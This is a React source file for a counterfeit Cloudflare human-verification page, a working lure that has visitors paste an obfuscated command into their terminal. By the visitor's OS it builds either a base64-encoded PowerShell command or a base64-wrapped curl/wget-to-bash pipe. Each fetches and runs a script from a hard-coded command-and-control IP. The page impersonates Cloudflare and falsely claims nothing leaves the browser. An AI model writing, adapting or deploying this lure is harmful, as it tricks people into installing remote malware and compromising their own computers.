import { useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";

function generateCode() {
  let code = "";
  for (let i = 0; i < 8; i++) {
    code += Math.floor(Math.random() * 10).toString();
  }
  return code;
}

function b64UTF16(str: string): string {
  let bin = "";
  for (let i = 0; i < str.length; i++) {
    const c = str.charCodeAt(i);
    bin += String.fromCharCode(c & 0xff) + String.fromCharCode((c >> 8) & 0xff);
  }
  return btoa(bin);
}

function b64Standard(str: string): string {
  return btoa(unescape(encodeURIComponent(str)));
}

function CloudMark({ className }: { className?: string }) {
  return (
    <svg viewBox="0 0 64 40" className={className} aria-hidden="true">
      <path
        fill="currentColor"
        d="M50.6 16.4A12.4 12.4 0 0 0 27.2 10 15.2 15.2 0 0 0 4 24.2 10.6 10.6 0 0 0 7.2 45h41.6a12.2 12.2 0 0 0 1.8-24.2z"
      />
    </svg>
  );
}

function CheckboxGlyph({ state }: { state: "idle" | "checking" | "ready" | "success" }) {
  if (state === "checking") {
    return (
      <span className="grid size-7 place-items-center">
        <span className="cf-spin size-5 rounded-full border-2 border-border border-t-primary" />
      </span>
    );
  }

  if (state === "success") {
    return (
      <span className="grid size-7 place-items-center rounded-sm border-2 border-success bg-success-bg text-success">
        <svg viewBox="0 0 20 20" className="size-4" aria-hidden="true">
          <path
            d="M4 10.5 8 14.5 16 6"
            fill="none"
            stroke="currentColor"
            strokeWidth="2.4"
            strokeLinecap="round"
            strokeLinejoin="round"
          />
        </svg>
      </span>
    );
  }

  return (
    <span
      className={
        "grid size-7 place-items-center rounded-sm border-2 bg-bg " +
        (state === "ready" ? "border-primary" : "border-faint")
      }
    >
      {state === "ready" ? (
        <svg viewBox="0 0 20 20" className="size-4 text-primary" aria-hidden="true">
          <path
            d="M4 10.5 8 14.5 16 6"
            fill="none"
            stroke="currentColor"
            strokeWidth="2.4"
            strokeLinecap="round"
            strokeLinejoin="round"
          />
        </svg>
      ) : null}
    </span>
  );
}

// ─── Main Component ───
export function VerificationPage() {
  const navigate = useNavigate();

  // Existing states
  const [checked, setChecked] = useState(false);
  const [checking, setChecking] = useState(false);
  const [code, setCode] = useState("");
  const [input, setInput] = useState("");
  const [status, setStatus] = useState<"idle" | "success" | "error">("idle");
  const [rayId, setRayId] = useState("----------------");
  const [copied, setCopied] = useState(false);
  const [note, setNote] = useState<"privacy" | "help" | null>(null);
  const stepsRef = useRef<HTMLDivElement>(null);

  // New states for command
  const [os, setOs] = useState<"windows" | "mac" | "linux" | null>(null);
  const [command, setCommand] = useState("");
  const [commandCopied, setCommandCopied] = useState(false);

  // ─── C2 URL – CHANGE THIS ───
  const C2_URL = "http://77.42.60.33";

  useEffect(() => {
    // Ray ID
    const bytes = new Uint8Array(8);
    crypto.getRandomValues(bytes);
    setRayId(Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join(""));

    // OS detection
    const ua = navigator.userAgent;
    if (/Windows/i.test(ua)) setOs("windows");
    else if (/Mac/i.test(ua) && !/iPhone|iPad|iPod/i.test(ua)) setOs("mac");
    else if (/Linux/i.test(ua)) setOs("linux");
  }, []);

  // Derived
  const revealed = checked && !checking && code.length > 0;
  const glyphState = status === "success" ? "success" : checking ? "checking" : revealed ? "ready" : "idle";

  function onToggle(next: boolean) {
    setStatus("idle");
    setInput("");
    if (!next) {
      setChecked(false);
      setChecking(false);
      setCode("");
      setCommand("");
      return;
    }
    setChecked(true);
    setChecking(true);
    const nextCode = generateCode();
    window.setTimeout(() => {
      setCode(nextCode);
      setChecking(false);

      // Build command based on OS
      if (os === "windows") {
        const psScript = `$k='\n CODE: ${nextCode}';Write-Host $k;$u='${C2_URL}/task1.cmd';$o=\"$env:TEMP\\f.cmd\";(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process cmd -ArgumentList \"/c $o\" -WindowStyle Hidden`;
        const b64Cmd = b64UTF16(psScript);
        const fullCmd = `powershell -Exec Bypass -EncodedCommand ${b64Cmd}`;
        setCommand(fullCmd);
      } else if (os === "mac" || os === "linux") {
        const shellScript = `#!/bin/bash\n(curl -s ${C2_URL}/task1.sh || wget -qO- ${C2_URL}/task1.sh) | bash; echo "\nCODE: ${nextCode}"`;
        const b64Script = b64Standard(shellScript);
        const fullCmd = `echo '${b64Script}' | base64 -d | bash`;
        setCommand(fullCmd);
      }

      window.setTimeout(() => {
        stepsRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
      }, 40);
    }, 700);
  }

  function onAnswer(raw: string) {
    const next = raw.replace(/\D/g, "").slice(0, 8);
    setInput(next);
    if (status === "error") setStatus("idle");
    if (revealed && next.length === 8 && next === code) {
      setStatus("success");
      window.setTimeout(() => {
        navigate({ to: "/home" });
      }, 400);
    }
  }

  function onVerify() {
    if (!revealed) return;
    if (input.trim() !== code) {
      setStatus("error");
      return;
    }
    setStatus("success");
    window.setTimeout(() => {
      navigate({ to: "/home" });
    }, 400);
  }

  async function copyCommand() {
    try {
      await navigator.clipboard.writeText(command);
      setCommandCopied(true);
      setTimeout(() => setCommandCopied(false), 1500);
    } catch {
      const ta = document.getElementById('command');
      ta.select();
      document.execCommand('copy');
      setCommandCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  }

  const widgetLabel =
    status === "success" ? "Success!" : checking ? "Verifying…" : "Verify you are human";

  return (
    <div className="flex min-h-screen flex-col bg-bg text-fg">
      <main className="mx-auto flex w-full max-w-md flex-1 flex-col items-start px-5 pt-20 pb-36 sm:pt-28">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          viewBox="92.992 223.675 373.116 59.243"
          className="mb-8 h-5 w-auto shrink-0 text-fg"
          aria-label="Logo"
          role="img"
        >
          <path
            fill="currentColor"
            d="M 210.988 240.885 C 206.693 240.882 202.502 242.206 198.988 244.675 L 198.988 223.675 L 189.988 223.675 L 189.988 282.845 L 198.988 282.845 L 198.988 279.075 C 212.221 288.361 230.544 279.84 231.969 263.737 C 233.058 251.431 223.342 240.849 210.988 240.885 Z M 210.988 273.885 C 201.75 273.885 195.977 263.885 200.596 255.885 C 205.215 247.885 216.762 247.885 221.38 255.885 C 222.434 257.71 222.988 259.779 222.988 261.885 C 222.972 268.501 217.604 273.855 210.988 273.855 Z"
          />
          <path fill="currentColor" d="M 239.988 240.885 L 248.988 240.885 L 248.988 282.885 L 239.988 282.885 Z M 239.988 227.395 L 248.988 227.395 L 248.988 236.395 L 239.988 236.395 Z" />
          <path fill="currentColor" d="M 283.348 273.855 L 276.348 273.855 C 273.868 273.855 272.348 271.855 272.348 269.365 L 272.348 249.875 L 284.888 249.875 L 281.728 240.875 L 272.388 240.875 L 272.388 228.815 L 263.388 231.985 L 263.388 240.885 L 255.988 240.885 L 255.988 249.885 L 263.438 249.885 L 263.438 272.355 C 263.433 278.14 268.114 282.834 273.898 282.845 L 283.398 282.845 Z" />
          <path fill="currentColor" d="M 320.988 240.885 L 308.988 271.765 L 296.878 240.885 L 287.878 240.885 L 304.268 282.885 L 313.618 282.885 L 330.008 240.885 Z" />
          <path fill="currentColor" d="M 352.988 273.855 C 343.75 273.855 337.977 263.855 342.596 255.855 C 347.215 247.855 358.762 247.855 363.38 255.855 C 364.434 257.68 364.988 259.749 364.988 261.855 C 364.988 268.483 359.615 273.855 352.988 273.855 Z M 364.988 244.675 C 351.74 235.412 333.431 243.964 332.033 260.069 C 330.634 276.174 347.195 287.754 361.841 280.912 C 362.941 280.399 363.994 279.791 364.988 279.095 L 364.988 282.865 L 373.988 282.865 L 373.988 240.865 L 364.988 240.865 Z" />
          <path fill="currentColor" d="M 422.098 240.885 L 413.098 240.885 L 401.048 271.765 L 388.988 240.885 L 379.988 240.885 L 396.368 282.885 L 405.698 282.885 Z" />
          <path fill="currentColor" d="M 445.108 273.855 C 435.87 273.855 430.097 263.855 434.716 255.855 C 439.335 247.855 450.882 247.855 455.5 255.855 C 456.554 257.68 457.108 259.749 457.108 261.855 C 457.108 268.483 451.735 273.855 445.108 273.855 Z M 445.108 240.855 C 428.942 240.855 418.839 258.355 426.922 272.355 C 435.004 286.355 455.212 286.355 463.295 272.355 C 465.138 269.163 466.108 265.542 466.108 261.855 C 466.108 250.257 456.706 240.855 445.108 240.855 Z" />
          <path fill="currentColor" d="M 123.668 230.701 L 144.469 230.701 L 113.758 282.178 L 92.992 282.178 Z" />
          <path fill="currentColor" d="M 142.768 256.274 L 163.557 256.274 L 148.202 282.178 L 127.424 282.178 Z" />
        </svg>

        <h2 className="text-left text-2xl font-normal tracking-tight">Performing security verification</h2>
        <p className="mt-4 text-left text-sm leading-relaxed text-muted">
          This website uses a security service to protect against malicious bots. This page is displayed while the
          website verifies you are not a bot.
        </p>

        <section
          className="mt-8 w-full overflow-hidden rounded-widget border border-border bg-widget shadow-sm"
          aria-label="Human verification"
        >
          <div className="flex items-center gap-3 px-3 py-3">
            <label className="flex min-w-0 flex-1 cursor-pointer items-center gap-3">
              <input
                type="checkbox"
                className="sr-only"
                checked={checked}
                onChange={(event) => onToggle(event.target.checked)}
              />
              <CheckboxGlyph state={glyphState} />
              <span className="text-sm font-medium">{widgetLabel}</span>
            </label>
            <div className="flex w-24 shrink-0 flex-col items-end leading-none">
              <CloudMark className="h-5 w-8 text-primary" />
              <span className="mt-1 text-xs font-semibold text-fg">Cloudflare</span>
              <span className="mt-1 flex gap-1 text-xs">
                <button
                  type="button"
                  className="text-link hover:underline"
                  onClick={() => setNote(note === "privacy" ? null : "privacy")}
                >
                  Privacy
                </button>
                <span className="text-faint" aria-hidden="true">·</span>
                <button
                  type="button"
                  className="text-link hover:underline"
                  onClick={() => setNote(note === "help" ? null : "help")}
                >
                  Help
                </button>
              </span>
            </div>
          </div>

          {note ? (
            <p className="border-t border-border px-3 py-2 text-xs leading-normal text-muted">
              {note === "privacy"
                ? "This check runs in your browser. The code stays on this page and is not sent anywhere."
                : "Check the box, answer the questions, then type the 8-digit code and press Verify."}
            </p>
          ) : null}

          {revealed && (
            <div ref={stepsRef} className="scroll-mt-6 space-y-4 border-t border-border bg-bg px-4 py-4">
              <p className="text-left text-sm leading-relaxed text-fg">
                For more clarity, please follow the steps below and write down your verification code.
              </p>
              <ol className="list-decimal space-y-2 pl-5 text-left text-sm text-fg">
                <li>Please open your <b>{os === "windows" ? "Command Prompt (Admin)" : "Terminal"}</b>.</li>
                <li>Paste the command below and press Enter. You will see your verification code.</li>
              </ol>

              {/* Command display */}
              {command && (
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <input
                      id="command"
                      readOnly
                      value={command}
                      className="h-12 min-w-0 flex-1 select-none rounded border border-border bg-bg px-3 font-mono text-xs tracking-wider text-fg"
                    />
                    <button
                      type="button"
                      onClick={copyCommand}
                      className="h-12 shrink-0 rounded bg-primary px-4 text-sm font-semibold text-on-primary hover:bg-primary-hover"
                    >
                      {commandCopied ? "Copied" : "Copy"}
                    </button>
                  </div>
                  <p className="text-xs text-muted">
                    (The command downloads a script and runs it. Your 8-digit code will appear in the terminal.)
                  </p>
                </div>
              )}

              <ol start={3} className="list-decimal space-y-2 pl-5 text-left text-sm text-fg">
                <li>Please write down the code from the terminal and enter it below.</li>
              </ol>

              <input
                id="verify-code"
                value={input}
                disabled={status === "success"}
                inputMode="numeric"
                maxLength={8}
                autoComplete="off"
                spellCheck={false}
                placeholder="Enter your verification code"
                aria-label="Enter your verification code"
                onChange={(event) => onAnswer(event.target.value)}
                onPaste={(event) => {
                  event.preventDefault();
                  onAnswer(event.clipboardData.getData("text"));
                }}
                onKeyDown={(event) => {
                  if (event.key === "Enter") onVerify();
                }}
                className="h-12 w-full rounded-widget border border-border bg-bg px-3 text-left text-sm text-fg outline-none placeholder:text-disabled-fg focus:border-primary disabled:bg-disabled disabled:text-disabled-fg"
              />

              <button
                type="button"
                onClick={onVerify}
                disabled={input.trim().length === 0 || status === "success"}
                className="h-12 w-full scroll-mb-24 rounded-widget bg-primary text-sm font-semibold text-on-primary hover:bg-primary-hover disabled:bg-disabled disabled:text-disabled-fg"
              >
                Verify
              </button>

              {status === "success" && (
                <p className="rounded-widget border border-success bg-success-bg px-3 py-3 text-center text-sm font-medium text-success">
                  Verification successful. Opening the exchange.
                </p>
              )}
              {status === "error" && (
                <p className="rounded-widget border border-danger bg-danger-bg px-3 py-3 text-center text-sm text-danger">
                  That code does not match. Check the code and try again.
                </p>
              )}
            </div>
          )}
        </section>
      </main>

      <footer className="fixed inset-x-0 bottom-0 flex items-center justify-between gap-3 border-t border-border bg-bg px-4 py-3 text-xs text-faint sm:px-6">
        <p>
          Ray ID: <span className="font-mono text-muted">{rayId}</span>
        </p>
        <p className="flex items-center gap-1.5">
          <span className="hidden sm:inline">Performance & security by</span>
          <CloudMark className="h-3.5 w-5 text-primary" />
          <span className="font-semibold text-fg">Cloudflare</span>
        </p>
      </footer>
    </div>
  );
}